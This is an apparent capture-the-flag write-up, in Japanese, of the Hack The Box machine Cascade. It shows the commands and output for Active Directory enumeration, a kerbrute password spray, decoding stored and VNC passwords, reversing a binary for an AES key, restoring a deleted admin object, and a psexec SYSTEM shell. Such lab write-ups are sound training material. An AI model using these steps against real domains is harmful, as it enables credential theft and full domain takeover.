# Recon

```
┌──(shoebill㉿shoebill)-[~/Cascade_10.10.10.182]
└─$ enum4linux -a -M -l -d 10.10.10.182
...
user:[CascGuest] rid:[0x1f5]
user:[arksvc] rid:[0x452]
user:[s.smith] rid:[0x453]
user:[r.thompson] rid:[0x455]
user:[util] rid:[0x457]
user:[j.wakefield] rid:[0x45c]
user:[s.hickson] rid:[0x461]
user:[j.goodhand] rid:[0x462]
user:[a.turnbull] rid:[0x464]
user:[e.crowe] rid:[0x467]
user:[b.hanson] rid:[0x468]
user:[d.burman] rid:[0x469]
user:[BackupSvc] rid:[0x46a]
user:[j.allen] rid:[0x46e]
user:[i.croft] rid:[0x46f]
```

この結果よりユーザリストを作る：

```
┌──(shoebill㉿shoebill)-[~/Cascade_10.10.10.182]
└─$ cat users.txt
arksvc
s.smith
r.thompson
util
j.wakefield
s.hickson
j.goodhand
a.turnbull
e.crowe
b.hanson
d.burman
BackupSvc
j.allen
i.croft
```
（まったくおいしい情報がみつからないので）`ldapsearch`で詳細にenumをする。

```
┌──(shoebill㉿shoebill)-[~/Cascade_10.10.10.182]
└─$ ldapsearch -x -H ldap://10.10.10.182 -b 'DC=cascade,DC=local' > ldapsearch-domain.txt
```
一列目のdnとかsAMAccoufntTypeとかobjectClassの項目で、出現頻度が少ないものに着目しようと思い、以下のように実行した（infoの欄にパスワードが書かれてたりすることがあるから）

```
┌──(shoebill㉿shoebill)-[~/Cascade_10.10.10.182]
└─$ cut -d : -f 1 ldapsearch-domain.txt | sort | uniq -c | sort  | less
...
      1 # {6AC1786C-016F-11D2-945F-00C04fB984F9}, Policies, System, cascade.local
      1 # {820E48A7-D083-4C2D-B5F8-B24462924714}, Policies, System, cascade.local
      1 # {D67C2AD5-44C7-4468-BA4C-199E75B2F295}, Policies, System, cascade.local
      1 auditingPolicy
      1 cascadeLegacyPwd
      1 dNSHostName
...
```

怪しい"cascadeLegacyPwd"という項目を発見。

```
┌──(shoebill㉿shoebill)-[~/Cascade_10.10.10.182]
└─$ grep LegacyPwd ldapsearch-domain.txt
cascadeLegacyPwd: clk0bjVldmE=

┌──(shoebill㉿shoebill)-[~/Cascade_10.10.10.182]
└─$ echo -n clk0bjVldmE= | base64 -d
rY4n5eva
```

`kerbrute`より、rY4n5evaはr.thompsonのパスワードと判明：

```
┌──(shoebill㉿shoebill)-[~/Cascade_10.10.10.182]
└─$ kerbrute passwordspray -v --dc 10.10.10.182 -d cascade.local users.txt 'rY4n5eva'    

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 10/25/22 - Ronnie Flathers @ropnop

2022/10/25 15:58:08 >  Using KDC(s):
2022/10/25 15:58:08 >   10.10.10.182:88

2022/10/25 15:58:17 >  [!] b.hanson@cascade.local:rY4n5eva - USER LOCKED OUT
2022/10/25 15:58:17 >  [!] e.crowe@cascade.local:rY4n5eva - USER LOCKED OUT
2022/10/25 15:58:23 >  [+] VALID LOGIN:  r.thompson@cascade.local:rY4n5eva
...
```

r.thompsonのクリデンシャルでSMBシェアをenumする：

```
┌──(shoebill㉿shoebill)-[~/Cascade_10.10.10.182]
└─$ smbclient -U r.thompson%rY4n5eva -L 10.10.10.182

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        Audit$          Disk      
        C$              Disk      Default share
        Data            Disk      
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        print$          Disk      Printer Drivers
        SYSVOL          Disk      Logon server share 
```

Dataにおいしい情報があった：

```
┌──(shoebill㉿shoebill)-[~/Cascade_10.10.10.182]
└─$ smbmap -R 'Data' -u r.thompson -p rY4n5eva -H 10.10.10.182 --depth 10 | tee SMB_Data.txt
[+] IP: 10.10.10.182:445	Name: 10.10.10.182                                      
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	Data                                              	READ ONLY	
	.\Data\*
	dr--r--r--                0 Wed Jan 29 07:05:51 2020	.
	dr--r--r--                0 Wed Jan 29 07:05:51 2020	..
	dr--r--r--                0 Mon Jan 13 10:45:14 2020	Contractors
	dr--r--r--                0 Mon Jan 13 10:45:10 2020	Finance
	dr--r--r--                0 Wed Jan 29 03:04:51 2020	IT
	dr--r--r--                0 Mon Jan 13 10:45:20 2020	Production
	dr--r--r--                0 Mon Jan 13 10:45:16 2020	Temps
	.\Data\IT\*
	dr--r--r--                0 Wed Jan 29 03:04:51 2020	.
	dr--r--r--                0 Wed Jan 29 03:04:51 2020	..
	dr--r--r--                0 Wed Jan 29 03:00:30 2020	Email Archives
	dr--r--r--                0 Wed Jan 29 03:04:51 2020	LogonAudit
	dr--r--r--                0 Wed Jan 29 09:53:04 2020	Logs
	dr--r--r--                0 Wed Jan 29 07:06:59 2020	Temp
	.\Data\IT\Email Archives\*
	dr--r--r--                0 Wed Jan 29 03:00:30 2020	.
	dr--r--r--                0 Wed Jan 29 03:00:30 2020	..
	fr--r--r--             2522 Wed Jan 29 03:00:30 2020	Meeting_Notes_June_2018.html
	.\Data\IT\Logs\*
	dr--r--r--                0 Wed Jan 29 09:53:04 2020	.
	dr--r--r--                0 Wed Jan 29 09:53:04 2020	..
	dr--r--r--                0 Wed Jan 29 09:53:04 2020	Ark AD Recycle Bin
	dr--r--r--                0 Wed Jan 29 09:56:00 2020	DCs
	.\Data\IT\Logs\Ark AD Recycle Bin\*
	dr--r--r--                0 Wed Jan 29 09:53:04 2020	.
	dr--r--r--                0 Wed Jan 29 09:53:04 2020	..
	fr--r--r--             1303 Wed Jan 29 10:19:11 2020	ArkAdRecycleBin.log
	.\Data\IT\Logs\DCs\*
	dr--r--r--                0 Wed Jan 29 09:56:00 2020	.
	dr--r--r--                0 Wed Jan 29 09:56:00 2020	..
	fr--r--r--             5967 Mon Jan 27 07:22:05 2020	dcdiag.log
	.\Data\IT\Temp\*
	dr--r--r--                0 Wed Jan 29 07:06:59 2020	.
	dr--r--r--                0 Wed Jan 29 07:06:59 2020	..
	dr--r--r--                0 Wed Jan 29 07:06:55 2020	r.thompson
	dr--r--r--                0 Wed Jan 29 05:00:05 2020	s.smith
	.\Data\IT\Temp\s.smith\*
	dr--r--r--                0 Wed Jan 29 05:00:05 2020	.
	dr--r--r--                0 Wed Jan 29 05:00:05 2020	..
	fr--r--r--             2680 Wed Jan 29 05:00:01 2020	VNC Install.reg
```

次のようにファイルをダウンロードする：

```
┌──(shoebill㉿shoebill)-[~/Cascade_10.10.10.182]
└─$ smbmap -u r.thompson -p rY4n5eva -H 10.10.10.182 -R Data -A 'Meeting_Notes_June_2018.html|ArkAdRecycleBin.log|VNC Install.reg'
[+] IP: 10.10.10.182:445	Name: 10.10.10.182                                      
[+] Starting search for files matching 'Meeting_Notes_June_2018.html|ArkAdRecycleBin.log|VNC Install.reg' on share Data.
[+] Match found! Downloading: Data\IT\Email Archives\Meeting_Notes_June_2018.html
[+] Match found! Downloading: Data\IT\Logs\Ark AD Recycle Bin\ArkAdRecycleBin.log
[+] Match found! Downloading: Data\IT\Temp\s.smith\VNC Install.reg
```

# initial shell

VNC Install.regというファイルにパスワードのhex表記があるのを発見：

```
┌──(shoebill㉿shoebill)-[~/Cascade_10.10.10.182]
└─$ cat 10.10.10.182-Data_IT_Temp_s.smith_VNC\ Install.reg
...
"EnableUrlParams"=dword:00000001
"Password"=hex:6b,cf,2a,4b,6e,5a,ca,0f
"AlwaysShared"=dword:00000000
"NeverShared"=dword:00000000
...
```

以下のように復号（[ここ](https://github.com/frizb/PasswordDecrypts)を参考）：

```
┌──(shoebill㉿shoebill)-[~/Cascade_10.10.10.182/SMB-Data]
└─$ echo -n 6bcf2a4b6e5aca0f | xxd -r -p | openssl enc -des-cbc --nopad --nosalt -K e84ad660c4721ae0 -iv 0000000000000000 -d | hexdump -Cv
00000000  73 54 33 33 33 76 65 32                           |sT333ve2|
00000008
```

ファイル名からして、s.smithのパスワードだと考えられるので次のように`evil-winrm`を実行してシェルをとる：

```
┌──(shoebill㉿shoebill)-[~/Cascade_10.10.10.182]
└─$ evil-winrm -i 10.10.10.182 -u s.smith -p sT333ve2
...
*Evil-WinRM* PS C:\Users\s.smith\Documents> whoami
cascade\s.smith
```

# Privesc

r.thompsonのクリデンシャルではSMBシェアのAudit$というフォルダが閲覧できなかったが、次のようにs.smithのそれでは閲覧可能：

```
┌──(shoebill㉿shoebill)-[~/Cascade_10.10.10.182/SMB-Audit]
└─$ smbclient -U s.smith%sT333ve2 '//10.10.10.182/Audit$'  
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Thu Jan 30 03:01:26 2020
  ..                                  D        0  Thu Jan 30 03:01:26 2020
  CascAudit.exe                      An    13312  Wed Jan 29 06:46:51 2020
  CascCrypto.dll                     An    12288  Thu Jan 30 03:00:20 2020
  DB 
...
smb: \> cd DB
smb: \DB\> dir
  .                                   D        0  Wed Jan 29 06:40:59 2020
  ..                                  D        0  Wed Jan 29 06:40:59 2020
  Audit.db                           An    24576  Wed Jan 29 06:39:24 2020

smb: \DB\> get Audit.db
```

このデータベースを調べると、ArkSvcのパスワードを発見：

```
┌──(shoebill㉿shoebill)-[~/Cascade_10.10.10.182/SMB-Audit]
└─$ sqlite3 'DB\Audit.db'
sqlite> .tables
DeletedUserAudit  Ldap              Misc            
sqlite> .schema Ldap
CREATE TABLE IF NOT EXISTS "Ldap" (
	"Id"	INTEGER PRIMARY KEY AUTOINCREMENT,
	"uname"	TEXT,
	"pwd"	TEXT,
	"domain"	TEXT
);
sqlite> select * from Ldap;
1|ArkSvc|BQO5l5Kj9MdErXx6Q6AGOw==|cascade.local
```

このarksvcのパスワードはただのbase64ではなく、単にデコードしただけでは文字化けしてしまう。

先のSMBシェアフォルダAudit$にあったexeファイルとdllファイルをダウンロードする：

```
┌──(shoebill㉿shoebill)-[~/Cascade_10.10.10.182/SMB-Audit]
└─$ smbclient -U s.smith%sT333ve2 '//10.10.10.182/Audit$'  
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Thu Jan 30 03:01:26 2020
  ..                                  D        0  Thu Jan 30 03:01:26 2020
  CascAudit.exe                      An    13312  Wed Jan 29 06:46:51 2020
  CascCrypto.dll                     An    12288  Thu Jan 30 03:00:20 2020
  DB 
...
smb: \> get CascAudit.exe
smb: \> get CascCrypto.dll
```

ファイル名からして、なにかパスワードをデクリプトするための情報がありそうなので、dnSpyで解析する（ghidraでなく、exeやdllの解析はdnSpyが最良）。

ざっとみたところ、base64に加えてAESによる暗号化も行っていると判明。

以下の画像のように、KeyとIVを発見：

![found_key](https://user-images.githubusercontent.com/85237728/197941730-b8426420-52d6-4184-81e8-49ea6d8b3e98.png)

![found-IV](https://user-images.githubusercontent.com/85237728/197941740-ad6957da-434a-462d-85ac-ae1290a40ad3.png)

あとはCyberChefにぶち込んで復号する：

![decrypt](https://user-images.githubusercontent.com/85237728/197941745-0f8d786d-2748-4a06-bea8-1cf6dac73ffb.png)


```
┌──(shoebill㉿shoebill)-[~/Cascade_10.10.10.182]
└─$ evil-winrm -i 10.10.10.182 -u arksvc -p w3lc0meFr31nd

*Evil-WinRM* PS C:\Users\arksvc\Documents> whoami
cascade\arksvc
```
arksvcはAD Recycle Binグループに属している：
```
*Evil-WinRM* PS C:\Users\arksvc\Documents> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                  Type             SID                                            Attributes
=========================================== ================ ============================================== ===============================================================
Everyone                                    Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                   Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                        Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
CASCADE\Data Share                          Alias            S-1-5-21-3332504370-1206983947-1165150453-1138 Mandatory group, Enabled by default, Enabled group, Local Group
CASCADE\IT                                  Alias            S-1-5-21-3332504370-1206983947-1165150453-1113 Mandatory group, Enabled by default, Enabled group, Local Group
CASCADE\AD Recycle Bin
...
```

AD Recycle Binのメンバーは、（Active Directory ごみ箱機能が有効化された後に）削除されたオブジェクトを確認したり復元したりできる。

参考：[【Active Directory】削除したオブジェクトをごみ箱から復元する](https://bizlog.tech/ad-object-restore/)

次のように、削除済みオブジェクトを表示する：

```
*Evil-WinRM* PS C:\Users\arksvc\Documents> Get-ADObject -filter {isDeleted -eq $true} -IncludeDeletedObjects -Properties *
...
cascadeLegacyPwd                : YmFDVDNyMWFOMDBkbGVz
CN                              : TempAdmin
                                  DEL:f0cc344d-31e0-4866-bceb-a842791ca059
codePage                        : 0
countryCode                     : 0
Created                         : 1/27/2020 3:23:08 AM
createTimeStamp                 : 1/27/2020 3:23:08 AM
Deleted                         : True
Description                     :
DisplayName                     : TempAdmin
DistinguishedName               : CN=TempAdmin\0ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN=Deleted Objects,DC=cascade,DC=local
dSCorePropagationData           : {1/27/2020 3:23:08 AM, 1/1/1601 12:00:00 AM}
givenName                       : TempAdmin
...
```

SMBシェアのDataフォルダにあった”Meeting_Notes_June_2018.html”に次のように書いてある：

![htmlfile](https://user-images.githubusercontent.com/85237728/197943493-1f79dbcc-a0df-41c9-ab1d-04dbf52c0da1.png)

AdministratorのパスワードがTempAdminのパスワードと同じ。

TempAdminのパスワードをデコードする：

```
┌──(shoebill㉿shoebill)-[~/Cascade_10.10.10.182]
└─$ echo -n YmFDVDNyMWFOMDBkbGVz | base64 -d              
baCT3r1aN00dles
```
このパスワードを使ってAdminのシェルをとる：

```
┌──(shoebill㉿shoebill)-[~/Cascade_10.10.10.182]
└─$ impacket-psexec -dc-ip 10.10.10.182 'cascade.local/Administrator:baCT3r1aN00dles@10.10.10.182'
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Requesting shares on 10.10.10.182.....
[*] Found writable share ADMIN$
[*] Uploading file SxxbiGOE.exe
[*] Opening SVCManager on 10.10.10.182.....
[*] Creating service TyLD on 10.10.10.182.....
[*] Starting service TyLD.....
[!] Press help for extra shell commands
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```

# 感想

複数のツールを使ってしらべることの大切さを実感した。ldapsearchで細かく調べたり。

またリバースエンジニアリングの練習も少しできたのでよかった（WindowsのBoxでは今回のようにexeファイルをRevしてパスワードやキーを得るという機会がけっこうある）。

